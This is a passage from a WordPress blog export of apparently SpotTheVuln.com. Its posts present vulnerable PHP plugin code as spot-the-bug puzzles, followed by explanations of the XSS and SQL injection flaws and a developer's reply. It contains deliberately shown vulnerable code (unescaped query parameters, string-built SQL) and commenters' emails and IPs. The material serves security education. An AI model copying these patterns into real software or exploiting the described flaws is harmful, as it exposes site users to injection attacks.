+			&lt;img src=&quot;&lt;?php echo str_replace(&quot; &quot;, &quot;%20&quot;, $lg_gallery-&gt;address.esc_attr($_GET['folder']).esc_attr($_GET['image'])); ?&gt;&quot; alt=&quot;&lt;?php echo $_GET['image']; ?&gt;&quot; /&gt; 
		&lt;/a&gt;
	&lt;/body&gt;
&lt;/html&gt;

&lt;?php

?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1404</wp:post_id>
		<wp:post_date>2011-04-01 05:30:26</wp:post_date>
		<wp:post_date_gmt>2011-04-01 12:30:26</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>proportion-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="post_tag" nicename="query-string"><![CDATA[query string]]></category>
		<category domain="post_tag" nicename="querystring"><![CDATA[querystring]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1873</wp:comment_id>
			<wp:comment_author><![CDATA[Marcel Brinkkemper]]></wp:comment_author>
			<wp:comment_author_email>marcel@brinkkemper.com</wp:comment_author_email>
			<wp:comment_author_url>http://brimosoft.nl/</wp:comment_author_url>
			<wp:comment_author_IP>84.106.26.253</wp:comment_author_IP>
			<wp:comment_date>2011-04-02 00:05:18</wp:comment_date>
			<wp:comment_date_gmt>2011-04-02 07:05:18</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hi there,
Thanks for the remarks.
However, I'm sorry to see that you haven't described the published patched version for this problem.
The script now first checks if the requested image does exist.
The src tag is escaped in another way and the alt tag is empty.
Please check Lazyest Gallery 1.0.30 or later.
http://brimosoft.nl/2011/03/11/important-security-update/
Version 0.9 is obsolete.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301806987.8342";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1301727918.693";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1881</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>174.21.240.151</wp:comment_author_IP>
			<wp:comment_date>2011-04-02 22:07:40</wp:comment_date>
			<wp:comment_date_gmt>2011-04-03 05:07:40</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hey Marcel!  Thanks for the comment.  Sorry if the description was a bit pointed.  I was just disappointed that a good test case didn't catch this issue.  I'll get over it :)

I'm glad you incorporated additional security checks.  I'll probably use them in a future example!  Thanks!  BK]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>1873</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301807260.1276";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Charming</title>
		<link>http://spotthevuln.com/2011/04/charming/</link>
		<pubDate>Mon, 04 Apr 2011 12:30:19 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1407</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>It is absurd to divide people into good and bad. People are either charming or tedious.
Oscar Wilde</strong></blockquote>
[sourcecode language="php"]
        &lt;/table&gt;
        &lt;br&gt;
        &lt;table&gt;
            &lt;tr&gt;
                &lt;td&gt;
                    &lt;table&gt;
                        &lt;tr&gt;&lt;td&gt;&lt;input type=checkbox name=oderbycount value=checked &lt;?php print $_GET['oderbycount'] ?&gt;&gt; &lt;?php _e('sort by count if grouped','statpresscn'); ?&gt;&lt;/td&gt;&lt;/tr&gt;
                        &lt;tr&gt;&lt;td&gt;&lt;input type=checkbox name=spider value=checked &lt;?php print $_GET['spider'] ?&gt;&gt; &lt;?php _e('include spiders/crawlers/bot','statpresscn'); ?&gt;&lt;/td&gt;&lt;/tr&gt;
                        &lt;tr&gt;&lt;td&gt;&lt;input type=checkbox name=feed value=checked &lt;?php print $_GET['feed'] ?&gt;&gt; &lt;?php _e('include feed','statpresscn'); ?&gt;&lt;/td&gt;&lt;/tr&gt;
                    &lt;/table&gt;
                &lt;/td&gt;
                &lt;td width=15&gt; &lt;/td&gt;
                &lt;td&gt;
                    &lt;table&gt;
                        &lt;tr&gt;
                            &lt;td&gt;&lt;?php _e('Limit results to','statpresscn'); ?&gt;
                                &lt;select name=limitquery&gt;&lt;?php if($_GET['limitquery'] &gt;0) { print &quot;&lt;option&gt;&quot;.$_GET['limitquery'].&quot;&lt;/option&gt;&quot;;} ?&gt;&lt;option&gt;200&lt;/option&gt;&lt;option&gt;150&lt;/option&gt;&lt;option&gt;50&lt;/option&gt;&lt;/select&gt;
                            &lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
                        &lt;tr&gt;
                            &lt;td align=right&gt;&lt;input type=submit value=&lt;?php _e('Search','statpresscn'); ?&gt; name=searchsubmit&gt;&lt;/td&gt;
                        &lt;/tr&gt;
                    &lt;/table&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
        &lt;/table&gt;&lt;!-- It's strange that the page value should be spc-search, and not others. --&gt;
        &lt;input type=hidden name=page value='spc-search'&gt;&lt;input type=hidden name=statpress_action value=search&gt;
    &lt;/form&gt;&lt;br&gt;
           &lt;?php
        if(isset($_GET['searchsubmit'])) {
        # query builder
            $qry=&quot;&quot;;
            # FIELDS
            $fields=&quot;&quot;;
            for($i=1;$i&lt;=5;$i++) {
                if($_GET[&quot;where$i&quot;] != '') {
                    $fields.=$_GET[&quot;where$i&quot;].&quot;,&quot;;
                }
            }
            $fields=rtrim($fields,&quot;,&quot;);
            # WHERE
            $where=&quot;WHERE 1=1&quot;;
            if($_GET['spider'] != 'checked') { $where.=&quot; AND spider=''&quot;; }
            if($_GET['feed'] != 'checked') { $where.=&quot; AND feed=''&quot;; }
            for($i=1;$i&lt;=5;$i++) {
                if(($_GET[&quot;what$i&quot;] != '') &amp;&amp; ($_GET[&quot;where$i&quot;] != '')) {
                    $where.=&quot; AND &quot;.$_GET[&quot;where$i&quot;].&quot; LIKE '%&quot;.$_GET[&quot;what$i&quot;].&quot;%'&quot;;
                }
            }
            # ORDER BY
            $orderby=&quot;&quot;;
            for($i=1;$i&lt;=5;$i++) {
                if(($_GET[&quot;sortby$i&quot;] == 'checked') &amp;&amp; ($_GET[&quot;where$i&quot;] != '')) {
                    $orderby.=$_GET[&quot;where$i&quot;].',';
                }
            }

            # GROUP BY
            $groupby=&quot;&quot;;
            for($i=1;$i&lt;=5;$i++) {
                if(($_GET[&quot;groupby$i&quot;] == 'checked') &amp;&amp; ($_GET[&quot;where$i&quot;] != '')) {
                    $groupby.=$_GET[&quot;where$i&quot;].',';
                }
            }
            if($groupby != '') {
                $grouparray = explode(&quot;,&quot;,rtrim($groupby,','));
                $groupby=&quot;GROUP BY &quot;.rtrim($groupby,',');
                $fields.=&quot;,count(*) as totale&quot;;
                if($_GET['oderbycount'] == 'checked') { $orderby=&quot;totale DESC,&quot;.$orderby; }
            }

            if($orderby != '') { $orderby=&quot;ORDER BY &quot;.rtrim($orderby,','); }


            $limit=&quot;LIMIT &quot;.$_GET['limitquery'];

            # Results
            print &quot;&lt;h2&gt;&quot;.__('Results','statpresscn').&quot;&lt;/h2&gt;&quot;;
            $sql=&quot;SELECT $fields FROM $table_name $where $groupby $orderby $limit;&quot;;
            //	print &quot;$sql&lt;br&gt;&quot;;
            print &quot;&lt;table class='widefat'&gt;&lt;thead&gt;&lt;tr&gt;&quot;;
            for($i=1;$i&lt;=5;$i++) {
                if($_GET[&quot;where$i&quot;] != '') { 
                    print &quot;&lt;th scope='col'&gt;&quot;;
                    if((count($grouparray)&gt;0)&amp;&amp;in_array($_GET[&quot;where$i&quot;],$grouparray)){
                        print &quot;&lt;font color=red&gt;&quot;;
                    }
                    print ucfirst($f[$_GET[&quot;where$i&quot;]]);
                    if((count($grouparray)&gt;0)&amp;&amp;in_array($_GET[&quot;where$i&quot;],$grouparray)){
                        print &quot;&lt;/font&gt;&quot;;
                    }
                    print &quot;&lt;/th&gt;&quot;;
                }
            }
            if($groupby != '') { print &quot;&lt;th scope='col'&gt;&lt;font color=red&gt;&quot;.__('Count','statpresscn').&quot;&lt;/font&gt;&lt;/th&gt;&quot;; }
            print &quot;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody id='the-list'&gt;&quot;;
            $qry=$wpdb-&gt;get_results($sql,ARRAY_N);
            $cloumnscount = count($wpdb-&gt;get_col_info(&quot;name&quot;));
            foreach ($qry as $rk) {
                print &quot;&lt;tr&gt;&quot;;
                for($i=1;$i&lt;=$cloumnscount;$i++) {
                    print &quot;&lt;td&gt;&quot;;
                    if($_GET[&quot;where$i&quot;] == 'urlrequested') { 
                        print &quot;&lt;a href=&quot;.heart5_config_url($rk[$i-1]).&quot; target=_heart5&gt;&quot;;
                        print iri_StatPress_Decode($rk[$i-1]);
                        print &quot;&lt;/a&gt;&quot;;
                    } else {
                        print $rk[$i-1];
                    }
//                    print $rk[$i-1];
                    print &quot;&lt;/td&gt;&quot;;
                }
                print &quot;&lt;/tr&gt;&quot;;
            }
            print &quot;&lt;/table&gt;&quot;;
            print &quot;&lt;br /&gt;&lt;br /&gt;&lt;font size=1 color=gray&gt;sql: $sql&lt;/font&gt;&quot;;
        }?&gt;
&lt;/div&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1407</wp:post_id>
		<wp:post_date>2011-04-04 05:30:19</wp:post_date>
		<wp:post_date_gmt>2011-04-04 12:30:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>charming</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1911</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, SQL Injection, Wordpress Vulnerability Code Example &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/04/charming-xss-uhhh-wait-actually-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-04-08 05:33:17</wp:comment_date>
			<wp:comment_date_gmt>2011-04-08 12:33:17</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Charming [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1302265997.8068";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1302504210.8998";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Charming - XSS (uhhh wait, actually - SQL Injection)</title>
		<link>http://spotthevuln.com/2011/04/charming-xss-uhhh-wait-actually-sql-injection/</link>
		<pubDate>Fri, 08 Apr 2011 12:30:10 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1411</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: StatPressCN 

Fixed in Version: 1.9.1

Issue Type: SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/04/charming/">Found Here</a>
<h1>Details</h1>
This patch was full of interesting tidbits.  First, the change log for this patch is as follows:
<blockquote>
**1.9.1** 
+ fix a flaw allowing a remote cross-site scripting attack
</blockquote>
Keep the change list description in mind as we go over the patch submitted by the developers.  The submitted patch is pretty simple.  There is an additional qualifier set for an if statement that checks to see if $_GET["where$i"] is contained within array $f.  It’s difficult to determine whether this is true… but it doesn’t really matter.  The second change is an addslashes  to $_GET["what$i"] before using the tainted query string parameter to build a dynamic SQL statement.  This is to prevent an obvious SQL injection bug in the LIKE operator of the SQL statement.

What’s surprising is the developer missed the $_GET["where$i"] query string parameter used to build the SQL statement on the same line.  This bug is equally devastating and results in SQL injection against the application.  So despite the change log description, this patch is to address a SQL injection bug, NOT an XSS.

Looking through the rest of the code, we see XSS (lines 7-9 and 17) and SQL injection bugs (lines 57,65, 77) littered throughout the code base.  These bugs still exist in the latest version, are not patched, and put users at risk.  If you have this plug-in installed, your server and users are at significant risk!


<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="7-9,57,65,77"]
        &lt;/table&gt;
        &lt;br&gt;
        &lt;table&gt;
            &lt;tr&gt;
                &lt;td&gt;
                    &lt;table&gt;
                        &lt;tr&gt;&lt;td&gt;&lt;input type=checkbox name=oderbycount value=checked &lt;?php print $_GET['oderbycount'] ?&gt;&gt; &lt;?php _e('sort by count if grouped','statpresscn'); ?&gt;&lt;/td&gt;&lt;/tr&gt;
                        &lt;tr&gt;&lt;td&gt;&lt;input type=checkbox name=spider value=checked &lt;?php print $_GET['spider'] ?&gt;&gt; &lt;?php _e('include spiders/crawlers/bot','statpresscn'); ?&gt;&lt;/td&gt;&lt;/tr&gt;
                        &lt;tr&gt;&lt;td&gt;&lt;input type=checkbox name=feed value=checked &lt;?php print $_GET['feed'] ?&gt;&gt; &lt;?php _e('include feed','statpresscn'); ?&gt;&lt;/td&gt;&lt;/tr&gt;
                    &lt;/table&gt;
                &lt;/td&gt;
                &lt;td width=15&gt; &lt;/td&gt;
                &lt;td&gt;
                    &lt;table&gt;
                        &lt;tr&gt;
                            &lt;td&gt;&lt;?php _e('Limit results to','statpresscn'); ?&gt;
                                &lt;select name=limitquery&gt;&lt;?php if($_GET['limitquery'] &gt;0) { print &quot;&lt;option&gt;&quot;.$_GET['limitquery'].&quot;&lt;/option&gt;&quot;;} ?&gt;&lt;option&gt;200&lt;/option&gt;&lt;option&gt;150&lt;/option&gt;&lt;option&gt;50&lt;/option&gt;&lt;/select&gt;
                            &lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
                        &lt;tr&gt;
                            &lt;td align=right&gt;&lt;input type=submit value=&lt;?php _e('Search','statpresscn'); ?&gt; name=searchsubmit&gt;&lt;/td&gt;
                        &lt;/tr&gt;
                    &lt;/table&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
        &lt;/table&gt;&lt;!-- It's strange that the page value should be spc-search, and not others. --&gt;
        &lt;input type=hidden name=page value='spc-search'&gt;&lt;input type=hidden name=statpress_action value=search&gt;
    &lt;/form&gt;&lt;br&gt;
           &lt;?php
        if(isset($_GET['searchsubmit'])) {
        # query builder
            $qry=&quot;&quot;;
            # FIELDS
            $fields=&quot;&quot;;
            for($i=1;$i&lt;=5;$i++) {
-               if($_GET[&quot;where$i&quot;] != '') {
+				if($_GET[&quot;where$i&quot;] != '' &amp;&amp; array_key_exists($_GET[&quot;where$i&quot;], $f)) {//??where??????
                    $fields.=$_GET[&quot;where$i&quot;].&quot;,&quot;;
                }
            }
            $fields=rtrim($fields,&quot;,&quot;);
            # WHERE
            $where=&quot;WHERE 1=1&quot;;
            if($_GET['spider'] != 'checked') { $where.=&quot; AND spider=''&quot;; }
            if($_GET['feed'] != 'checked') { $where.=&quot; AND feed=''&quot;; }
            for($i=1;$i&lt;=5;$i++) {
                if(($_GET[&quot;what$i&quot;] != '') &amp;&amp; ($_GET[&quot;where$i&quot;] != '')) {
-                   $where.=&quot; AND &quot;.$_GET[&quot;where$i&quot;].&quot; LIKE '%&quot;.$_GET[&quot;what$i&quot;].&quot;%'&quot;;
+					$where.=&quot; AND &quot;.$_GET[&quot;where$i&quot;].&quot; LIKE '%&quot;.addslashes($_GET[&quot;what$i&quot;]).&quot;%'&quot;;//addslashes??????
                }
            }
            # ORDER BY
            $orderby=&quot;&quot;;
            for($i=1;$i&lt;=5;$i++) {
                if(($_GET[&quot;sortby$i&quot;] == 'checked') &amp;&amp; ($_GET[&quot;where$i&quot;] != '')) {
                    $orderby.=$_GET[&quot;where$i&quot;].',';
                }
            }

            # GROUP BY
            $groupby=&quot;&quot;;
            for($i=1;$i&lt;=5;$i++) {
                if(($_GET[&quot;groupby$i&quot;] == 'checked') &amp;&amp; ($_GET[&quot;where$i&quot;] != '')) {
                    $groupby.=$_GET[&quot;where$i&quot;].',';
                }
            }
            if($groupby != '') {
                $grouparray = explode(&quot;,&quot;,rtrim($groupby,','));
                $groupby=&quot;GROUP BY &quot;.rtrim($groupby,',');
                $fields.=&quot;,count(*) as totale&quot;;
                if($_GET['oderbycount'] == 'checked') { $orderby=&quot;totale DESC,&quot;.$orderby; }
            }

            if($orderby != '') { $orderby=&quot;ORDER BY &quot;.rtrim($orderby,','); }


            $limit=&quot;LIMIT &quot;.$_GET['limitquery'];

            # Results
            print &quot;&lt;h2&gt;&quot;.__('Results','statpresscn').&quot;&lt;/h2&gt;&quot;;
            $sql=&quot;SELECT $fields FROM $table_name $where $groupby $orderby $limit;&quot;;
            //	print &quot;$sql&lt;br&gt;&quot;;
            print &quot;&lt;table class='widefat'&gt;&lt;thead&gt;&lt;tr&gt;&quot;;
            for($i=1;$i&lt;=5;$i++) {
                if($_GET[&quot;where$i&quot;] != '') { 
                    print &quot;&lt;th scope='col'&gt;&quot;;
                    if((count($grouparray)&gt;0)&amp;&amp;in_array($_GET[&quot;where$i&quot;],$grouparray)){
                        print &quot;&lt;font color=red&gt;&quot;;
                    }
                    print ucfirst($f[$_GET[&quot;where$i&quot;]]);
                    if((count($grouparray)&gt;0)&amp;&amp;in_array($_GET[&quot;where$i&quot;],$grouparray)){
                        print &quot;&lt;/font&gt;&quot;;
                    }
                    print &quot;&lt;/th&gt;&quot;;
                }
            }
            if($groupby != '') { print &quot;&lt;th scope='col'&gt;&lt;font color=red&gt;&quot;.__('Count','statpresscn').&quot;&lt;/font&gt;&lt;/th&gt;&quot;; }
            print &quot;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody id='the-list'&gt;&quot;;
            $qry=$wpdb-&gt;get_results($sql,ARRAY_N);
            $cloumnscount = count($wpdb-&gt;get_col_info(&quot;name&quot;));
            foreach ($qry as $rk) {
                print &quot;&lt;tr&gt;&quot;;
                for($i=1;$i&lt;=$cloumnscount;$i++) {
                    print &quot;&lt;td&gt;&quot;;
                    if($_GET[&quot;where$i&quot;] == 'urlrequested') { 
                        print &quot;&lt;a href=&quot;.heart5_config_url($rk[$i-1]).&quot; target=_heart5&gt;&quot;;
                        print iri_StatPress_Decode($rk[$i-1]);
                        print &quot;&lt;/a&gt;&quot;;
                    } else {
                        print $rk[$i-1];
                    }
//                    print $rk[$i-1];
                    print &quot;&lt;/td&gt;&quot;;
                }
                print &quot;&lt;/tr&gt;&quot;;
            }
            print &quot;&lt;/table&gt;&quot;;
            print &quot;&lt;br /&gt;&lt;br /&gt;&lt;font size=1 color=gray&gt;sql: $sql&lt;/font&gt;&quot;;
        }?&gt;
&lt;/div&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1411</wp:post_id>
		<wp:post_date>2011-04-08 05:30:10</wp:post_date>
		<wp:post_date_gmt>2011-04-08 12:30:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>charming-xss-uhhh-wait-actually-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="addslashes"><![CDATA[addslashes]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="injection-bug"><![CDATA[injection bug]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Fall</title>
		<link>http://spotthevuln.com/2011/04/fall/</link>
		<pubDate>Mon, 11 Apr 2011 12:30:10 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1416</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Some rise by sin, and some by virtue fall.
William Shakespeare</strong></blockquote>
[sourcecode language="php"]
&lt;?php
...snip...

	function QcodoHandleError($__exc_errno, $__exc_errstr, $__exc_errfile, $__exc_errline, $blnExit = true) {
		// If a command is called with &quot;@&quot;, then we should return
		if (error_reporting() == 0)
			return;

		if (class_exists('QApplicationBase'))
			QApplicationBase::$ErrorFlag = true;

		global $__exc_strType;
		if (isset($__exc_strType))
			return;

		$__exc_strType = &quot;Error&quot;;
		$__exc_strMessage = $__exc_errstr;

		switch ($__exc_errno) {
			case E_ERROR:
				$__exc_strObjectType = &quot;E_ERROR&quot;;
				break;
			case E_WARNING:
				$__exc_strObjectType = &quot;E_WARNING&quot;;
				break;
			case E_PARSE:
				$__exc_strObjectType = &quot;E_PARSE&quot;;
				break;
			case E_NOTICE:
				$__exc_strObjectType = &quot;E_NOTICE&quot;;
				break;
			case E_STRICT:
				$__exc_strObjectType = &quot;E_STRICT&quot;;
				break;
			case E_CORE_ERROR:
				$__exc_strObjectType = &quot;E_CORE_ERROR&quot;;
				break;
			case E_CORE_WARNING:
				$__exc_strObjectType = &quot;E_CORE_WARNING&quot;;
				break;
			case E_COMPILE_ERROR:
				$__exc_strObjectType = &quot;E_COMPILE_ERROR&quot;;
				break;
			case E_COMPILE_WARNING:
				$__exc_strObjectType = &quot;E_COMPILE_WARNING&quot;;
				break;
			case E_USER_ERROR:
				$__exc_strObjectType = &quot;E_USER_ERROR&quot;;
				break;
			case E_USER_WARNING:
				$__exc_strObjectType = &quot;E_USER_WARNING&quot;;
				break;
			case E_USER_NOTICE:
				$__exc_strObjectType = &quot;E_USER_NOTICE&quot;;
				break;
			default:
				$__exc_strObjectType = &quot;Unknown&quot;;
				break;
		}

		$__exc_strFilename = $__exc_errfile;
		$__exc_intLineNumber = $__exc_errline;
		$__exc_strStackTrace = &quot;&quot;;
		$__exc_objBacktrace = debug_backtrace();
		for ($__exc_intIndex = 0; $__exc_intIndex &lt; count($__exc_objBacktrace); $__exc_intIndex++) {
			$__exc_objItem = $__exc_objBacktrace[$__exc_intIndex];
			
			$__exc_strKeyFile = (array_key_exists(&quot;file&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;file&quot;] : &quot;&quot;;
			$__exc_strKeyLine = (array_key_exists(&quot;line&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;line&quot;] : &quot;&quot;;
			$__exc_strKeyClass = (array_key_exists(&quot;class&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;class&quot;] : &quot;&quot;;
			$__exc_strKeyType = (array_key_exists(&quot;type&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;type&quot;] : &quot;&quot;;
			$__exc_strKeyFunction = (array_key_exists(&quot;function&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;function&quot;] : &quot;&quot;;
			
			$__exc_strStackTrace .= sprintf(&quot;#%s %s(%s): %s%s%s()\n&quot;,
				$__exc_intIndex,
				$__exc_strKeyFile,
				$__exc_strKeyLine,
				$__exc_strKeyClass,
				$__exc_strKeyType,
				$__exc_strKeyFunction);
		}

		if (ob_get_length()) {
			$__exc_strRenderedPage = ob_get_contents();
			ob_clean();
		}

		// Call to display the Error Page (as defined in configuration.inc.php)
		require(__DOCROOT__ . ERROR_PAGE_PATH);
		if($blnExit)
			exit;
	}

	function PrepDataForScript($strData) {
		$strData = str_replace(&quot;\\&quot;, &quot;\\\\&quot;, $strData);
		$strData = str_replace(&quot;\n&quot;, &quot;\\n&quot;, $strData);
